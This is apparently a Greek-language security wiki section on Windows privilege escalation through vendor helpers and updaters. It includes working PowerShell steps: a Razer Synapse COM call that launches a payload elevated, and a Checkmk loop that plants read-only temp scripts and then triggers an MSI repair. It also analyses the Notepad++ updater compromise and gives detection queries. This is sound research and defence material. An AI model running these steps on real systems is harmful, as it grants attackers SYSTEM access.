## 3) COM/IPC “elevator” helpers με αδύναμη επικύρωση σε user mode (Razer Synapse 4)

Το Razer Synapse 4 πρόσθεσε ένα ακόμη χρήσιμο μοτίβο σε αυτή την κατηγορία: ένας χρήστης με χαμηλά δικαιώματα μπορεί να ζητήσει από έναν COM helper να εκκινήσει μια διεργασία μέσω του `RzUtility.Elevator`, ενώ η απόφαση εμπιστοσύνης ανατίθεται σε ένα DLL user mode (`simple_service.dll`) αντί να επιβάλλεται ισχυρά εντός του προνομιούχου ορίου.

Παρατηρημένη διαδρομή εκμετάλλευσης:
- Δημιουργήστε το COM object `RzUtility.Elevator`.
- Καλέστε το `LaunchProcessNoWait(<path>, "", 1)` για να ζητήσετε εκκίνηση με αυξημένα δικαιώματα.
- Στο δημόσιο PoC, το PE-signature gate μέσα στο `simple_service.dll` παρακάμπτεται με patch πριν από την αποστολή του αιτήματος, επιτρέποντας την εκκίνηση ενός αυθαίρετου εκτελέσιμου που επιλέγει ο επιτιθέμενος.<sup>[[6]](#references)[[10]](#references)</sup>

Ελάχιστη κλήση PowerShell:

```powershell
$com = New-Object -ComObject 'RzUtility.Elevator'
$com.LaunchProcessNoWait("C:\Users\Public\payload.exe", "", 1)
```

Γενικό συμπέρασμα: όταν κάνετε reverse engineering σε σουίτες «helper», μην περιορίζεστε σε localhost TCP ή named pipes. Ελέγξτε για COM classes με ονόματα όπως `Elevator`, `Launcher`, `Updater` ή `Utility` και, στη συνέχεια, επαληθεύστε αν η privileged υπηρεσία επικυρώνει η ίδια το binary-στόχο ή απλώς εμπιστεύεται ένα αποτέλεσμα που υπολογίζεται από ένα τροποποιήσιμο user-mode client DLL. Αυτό το μοτίβο γενικεύεται πέρα από τη Razer: κάθε σχεδιασμός με διαχωρισμό, όπου ο broker υψηλών προνομίων χρησιμοποιεί μια απόφαση allow/deny από την πλευρά χαμηλών προνομίων, αποτελεί πιθανή επιφάνεια privesc.


---
## Εκτέλεση προβλέψιμου προσωρινού script κατά την επιδιόρθωση MSI (Checkmk Agent / CVE-2024-0670)

Ορισμένοι Windows agents εξακολουθούν να υλοποιούν privileged ενέργειες γράφοντας ένα προσωρινό `.cmd` στο `C:\Windows\Temp` και εκτελώντας το ως `SYSTEM`. Αν το όνομα αρχείου είναι προβλέψιμο και η υπηρεσία δεν δημιουργεί με ασφάλεια ξανά τα υπάρχοντα αρχεία, ένας χρήστης με χαμηλά προνόμια μπορεί να δημιουργήσει εκ των προτέρων το μελλοντικό προσωρινό αρχείο ως **μόνο για ανάγνωση**, ώστε η privileged διεργασία να εκτελέσει περιεχόμενο ελεγχόμενο από τον επιτιθέμενο αντί για το δικό της script.

Παρατηρήθηκε σε ευάλωτες εκδόσεις του Checkmk Agent:
- μοτίβο temp: `cmk_all_<PID>_1.cmd`
- επηρεαζόμενοι κλάδοι: `2.0.0`, `2.1.0`, `2.2.0`
- έναυσμα: **repair** του MSI του αποθηκευμένου πακέτου agent<sup>[[8]](#references)[[9]](#references)</sup>

Πρακτική διαδικασία:
1. Εκτιμήστε ένα ρεαλιστικό εύρος PID από τα τρέχοντα process IDs ή το PID του agent που εκτελείται.
2. Γράψτε ένα σύντομο **ASCII** payload `.cmd` (`Set-Content -Encoding Ascii` ή ανακατεύθυνση `cmd.exe`· αποφύγετε έξοδο PowerShell σε UTF-16 για batch files).
3. Δημιουργήστε μαζικά αρχεία `C:\Windows\Temp\cmk_all_<PID>_1.cmd` για το πιθανό εύρος και ορίστε τα ως μόνο για ανάγνωση.
4. Ενεργοποιήστε την επιδιόρθωση του αποθηκευμένου MSI, ώστε η privileged υπηρεσία να προσπαθήσει να αναδημιουργήσει και έπειτα να εκτελέσει το προσωρινό script.<sup>[[7]](#references)</sup>

```powershell
Set-Content -Path C:\ProgramData\payload.cmd -Encoding Ascii -Value "@echo off`nwhoami > C:\ProgramData\proof.txt"
1..10000 | ForEach-Object {
  Copy-Item C:\ProgramData\payload.cmd "C:\Windows\Temp\cmk_all_${_}_1.cmd"
  Set-ItemProperty "C:\Windows\Temp\cmk_all_${_}_1.cmd" -Name IsReadOnly -Value $true
}
```

Αν το ευάλωτο προϊόν έχει εγκατασταθεί με το Windows Installer, αντιστοίχισε το αρχείο MSI με το τυχαίο όνομα που είναι αποθηκευμένο στην cache του `C:\Windows\Installer` με το όνομα του προϊόντος, πριν ενεργοποιήσεις την επιδιόρθωση:<sup>[[7]](#references)</sup>

```powershell
Get-ChildItem "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-18\Products\*\InstallProperties" |
  ForEach-Object {
    $p = Get-ItemProperty $_.PSPath
    [PSCustomObject]@{Name=$p.DisplayName; Pkg=$p.LocalPackage}
  } | Where-Object Name -like "*Check MK Agent*"

msiexec /fa C:\Windows\Installer\<cached-agent>.msi
```

Σημειώσεις λειτουργίας:
- Το `qwinsta` είναι χρήσιμο όταν αποτυγχάνει το `msiexec /fa` από μη διαδραστικό κέλυφος WinRM και χρειάζεται να διαπιστώσετε αν μια υπάρχουσα συνεδρία επιφάνειας εργασίας ή αποσυνδεδεμένη συνεδρία μπορεί να ενεργοποιήσει σωστά την επιδιόρθωση.<sup>[[7]](#references)</sup>
- Αυτό το μοτίβο γενικεύεται και σε άλλους agents τελικών σημείων και updaters που **τοποθετούν προσωρινά scripts σε τοποθεσίες με δικαιώματα εγγραφής για όλους και αργότερα τα εκτελούν ως SYSTEM**. Ελέγξτε για προβλέψιμα ονόματα, απουσία σημασιολογίας αποκλειστικής δημιουργίας και ροές επιδιόρθωσης/ενημέρωσης που μπορούν να ενεργοποιηθούν κατ' απαίτηση.

### Διαδραστική επιδιόρθωση installer και προνομιούχα κονσόλα

Το PDF24 Creator 11.15.1 αποτελεί παράδειγμα ξεχωριστού κινδύνου επιδιόρθωσης MSI: η custom action εγκατάστασης του εκτυπωτή μπορεί να ανοίξει ορατή κονσόλα με δικαιώματα SYSTEM κατά την επιδιόρθωση. Ο προμηθευτής άλλαξε το MSI installer στην έκδοση 11.15.2 για να αντιμετωπίσει αυτήν τη συμπεριφορά. Μια παλαιότερη έκδοση προϊόντος αποτελεί μόνο ένδειξη για περαιτέρω διερεύνηση. Ελέγξτε το καταχωρισμένο ή προσβάσιμο πακέτο MSI, αν αυτός ο χρήστης μπορεί να ξεκινήσει επιδιόρθωση, αν υπάρχουν η ευάλωτη custom action και η καθυστέρηση του αρχείου καταγραφής, καθώς και αν μια διαδραστική επιφάνεια εργασίας μπορεί να εμφανίσει την κονσόλα. Η αναφερόμενη καθυστέρηση χρησιμοποιούσε ένα oplock στο `faxPrnInst.log`· η συνήθης δυνατότητα εγγραφής στο αρχείο δεν είναι η μόνη προϋπόθεση πρόσβασης. Ένα μη διαδραστικό κέλυφος, ένα μη προσβάσιμο πακέτο ή ένας ενημερωμένος installer μπορεί να διακόψει την αλυσίδα. Αυτό το ζήτημα δεν εξαρτάται από το `AlwaysInstallElevated` και διαφέρει από την αντικατάσταση ενός προβλέψιμου προσωρινού script.

---
## Απομακρυσμένη παραβίαση της αλυσίδας εφοδιασμού μέσω ανεπαρκούς επικύρωσης updater (WinGUp / Notepad++)

Μεταξύ Ιουνίου 2025 και Δεκεμβρίου 2025, εισβολείς που παραβίασαν την υποδομή φιλοξενίας πίσω από τη ροή ενημερώσεων του Notepad++ παρείχαν επιλεκτικά κακόβουλα manifests σε επιλεγμένα θύματα. Οι παλαιότεροι updaters που βασίζονταν στο WinGUp δεν επαλήθευαν πλήρως τη γνησιότητα των ενημερώσεων, επομένως μια κακόβουλη απόκριση XML μπορούσε να ανακατευθύνει τους clients σε URL που ελέγχονταν από τους εισβολείς. Επειδή ο client αποδεχόταν περιεχόμενο HTTPS χωρίς να επιβάλλει τόσο έμπιστη αλυσίδα πιστοποιητικών όσο και έγκυρη PE signature στο ληφθέν installer, τα θύματα κατέβαζαν και εκτελούσαν ένα τροποποιημένο με trojan NSIS `update.exe`.<sup>[[12]](#references)[[13]](#references)</sup>

Επιχειρησιακή ροή (δεν απαιτείται τοπικό exploit):
1. **Παρεμβολή στην υποδομή**: παραβίαση CDN/φιλοξενίας και απόκριση στους ελέγχους ενημερώσεων με metadata εισβολέα που παραπέμπουν σε κακόβουλο URL λήψης.
2. **Τροποποιημένο με trojan NSIS**: ο installer κατεβάζει/εκτελεί ένα payload και καταχράται δύο αλυσίδες εκτέλεσης:
   - **Bring-your-own signed binary + sideload**: συμπεριλαμβάνει το υπογεγραμμένο Bitdefender `BluetoothService.exe` και τοποθετεί ένα κακόβουλο `log.dll` στη διαδρομή αναζήτησής του. Όταν εκτελείται το υπογεγραμμένο binary, τα Windows κάνουν sideload το `log.dll`, το οποίο αποκρυπτογραφεί και φορτώνει ανακλαστικά το backdoor Chrysalis (προστατευμένο με Warbird + API hashing για να δυσχεραίνει τη στατική ανίχνευση).
   - **Έγχυση shellcode μέσω script**: το NSIS εκτελεί ένα μεταγλωττισμένο Lua script που χρησιμοποιεί Win32 APIs (π.χ. `EnumWindowStationsW`) για να εγχύσει shellcode και να προετοιμάσει το Cobalt Strike Beacon.<sup>[[12]](#references)</sup>

Σημεία για ενίσχυση προστασίας/ανίχνευση σε κάθε auto-updater:
- Επιβάλετε **επαλήθευση πιστοποιητικού + signature** του ληφθέντος installer (καρφιτσώστε το signer του προμηθευτή, απορρίψτε ασύμβατο CN/chain) και υπογράψτε και το update manifest (π.χ. με XMLDSig). Αποκλείστε τις ανακατευθύνσεις που ορίζονται από το manifest, εκτός αν έχουν επικυρωθεί.
- Αντιμετωπίστε το **BYO signed binary sideloading** ως σημείο διερεύνησης μετά τη λήψη: ειδοποιηθείτε όταν ένα υπογεγραμμένο EXE προμηθευτή φορτώνει DLL με όνομα που βρίσκεται εκτός της κανονικής διαδρομής εγκατάστασής του (π.χ. το Bitdefender φορτώνει `log.dll` από Temp/Downloads) και όταν ένας updater τοποθετεί/εκτελεί installers από προσωρινή τοποθεσία με signatures που δεν ανήκουν στον προμηθευτή.
- Παρακολουθείτε **τεχνουργήματα ειδικά για το malware** που παρατηρήθηκαν σε αυτήν την αλυσίδα (χρήσιμα ως γενικά σημεία διερεύνησης): mutex `Global\Jdhfv_1.0.1`, ασυνήθιστες εγγραφές του `gup.exe` στο `%TEMP%` και στάδια έγχυσης shellcode που καθοδηγούνται από Lua.
- Το Notepad++ ανταποκρίθηκε ενισχύοντας το WinGUp στην έκδοση v8.8.9 και σε μεταγενέστερες: το XML που επιστρέφεται είναι πλέον υπογεγραμμένο (XMLDSig), ενώ οι νεότερες εκδόσεις επιβάλλουν επαλήθευση πιστοποιητικού + signature του ληφθέντος installer αντί να εμπιστεύονται μόνο τη μεταφορά.<sup>[[13]](#references)</sup>

<details>
<summary>Cortex XDR XQL – sideloading του υπογεγραμμένου από Bitdefender EXE `log.dll` (T1574.001)</summary>

```sql
// Identifies Bitdefender-signed processes loading log.dll outside vendor paths
config case_sensitive = false
| dataset = xdr_data
| fields actor_process_signature_vendor, actor_process_signature_product, action_module_path, actor_process_image_path, actor_process_image_sha256, agent_os_type, event_type, event_id, agent_hostname, _time, actor_process_image_name
| filter event_type = ENUM.LOAD_IMAGE and agent_os_type = ENUM.AGENT_OS_WINDOWS
| filter actor_process_signature_vendor contains "Bitdefender SRL" and action_module_path contains "log.dll"
| filter actor_process_image_path not contains "Program Files\\Bitdefender"
| filter not actor_process_image_name in ("eps.rmm64.exe", "downloader.exe", "installer.exe", "epconsole.exe", "EPHost.exe", "epintegrationservice.exe", "EPPowerConsole.exe", "epprotectedservice.exe", "DiscoverySrv.exe", "epsecurityservice.exe", "EPSecurityService.exe", "epupdateservice.exe", "testinitsigs.exe", "EPHost.Integrity.exe", "WatchDog.exe", "ProductAgentService.exe", "EPLowPrivilegeWorker.exe", "Product.Configuration.Tool.exe", "eps.rmm.exe")
```

</details>

<details>
<summary>Cortex XDR XQL – <code>gup.exe</code> εκκινεί πρόγραμμα εγκατάστασης που δεν είναι του Notepad++</summary>

```sql
config case_sensitive = false
| dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START and _product = "XDR agent" and _vendor = "PANW"
| filter lowercase(actor_process_image_name) = "gup.exe" and actor_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN ) and action_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN )
| filter lowercase(action_process_image_name) ~= "(npp[\.\d]+?installer)"
| filter action_process_signature_status != ENUM.SIGNED or lowercase(action_process_signature_vendor) != "notepad++"
```

</details>

Αυτά τα μοτίβα ισχύουν για κάθε updater που δέχεται μη υπογεγραμμένα manifests ή δεν περιορίζει τους υπογράφοντες των installers: παραβίαση δικτύου + κακόβουλος installer + sideloading με δικό σας υπογεγραμμένο αρχείο οδηγούν σε απομακρυσμένη εκτέλεση κώδικα υπό το πρόσχημα «έμπιστων» ενημερώσεων.

---
## References
- [1] [Συμβουλευτικό δελτίο – Netskope Client for Windows – Τοπική κλιμάκωση προνομίων μέσω κακόβουλου server (CVE-2025-0309)](https://blog.amberwolf.com/blog/2025/august/advisory---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [2] [Συμβουλευτικό δελτίο ασφαλείας Netskope NSKPSA-2025-002](https://www.netskope.com/resources/netskope-resources/netskope-security-advisory-nskpsa-2025-002)
- [3] [NachoVPN – plugin Netskope](https://github.com/AmberWolfCyber/NachoVPN)
- [4] [UpSkope – IPC client/exploit του Netskope](https://github.com/AmberWolfCyber/UpSkope)
- [5] [NVD – CVE-2025-0309](https://nvd.nist.gov/vuln/detail/CVE-2025-0309)
- [6] [SensePost – Pwning των ASUS DriverHub, MSI Center, Acer Control Centre και Razer Synapse 4](https://sensepost.com/blog/2025/pwning-asus-driverhub-msi-center-acer-control-centre-and-razer-synapse-4/)
- [7] [0xdf – HTB: NanoCorp](https://0xdf.gitlab.io/2026/06/20/htb-nanocorp.html)
- [8] [SEC Consult – Τοπική κλιμάκωση προνομίων μέσω εγγράψιμων αρχείων στο Checkmk Agent](https://sec-consult.com/vulnerability-lab/advisory/local-privilege-escalation-via-writable-files-in-checkmk-agent/)
- [9] [Checkmk Werk #16361 – Κλιμάκωση προνομίων στον Windows agent](https://checkmk.com/werk/16361)
- [10] [PoCs του sensepost/bloatware-pwn](https://github.com/sensepost/bloatware-pwn)
- [11] [PipeViewer του CyberArk](https://github.com/cyberark/PipeViewer)
- [12] [Unit 42 – Κρατικοί φορείς εκμεταλλεύονται την εφοδιαστική αλυσίδα του Notepad++](https://unit42.paloaltonetworks.com/notepad-infrastructure-compromise/)
- [13] [Notepad++ – ενημέρωση για το περιστατικό παραβίασης υποδομής](https://notepad-plus-plus.org/news/hijacked-incident-info-update/)
- [14] [AmberWolf – Παράκαμψη της επιδιόρθωσης για το CVE-2025-0309 στο Netskope Client for Windows](https://blog.amberwolf.com/blog/2026/march/patch-bypass---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [15] [Atredis – Αποκάλυψη σφαλμάτων κλιμάκωσης προνομίων στο Lenovo Vantage](https://www.atredis.com/blog/2025/7/7/uncovering-privilege-escalation-bugs-in-lenovo-vantage)
- [16] [Quarkslab – MyReport Updater: Από το gRPC στο SYSTEM](https://blog.quarkslab.com/myreport-updater-from-grpc-to-system.html)
{{#include ../../banners/hacktricks-training.md}}
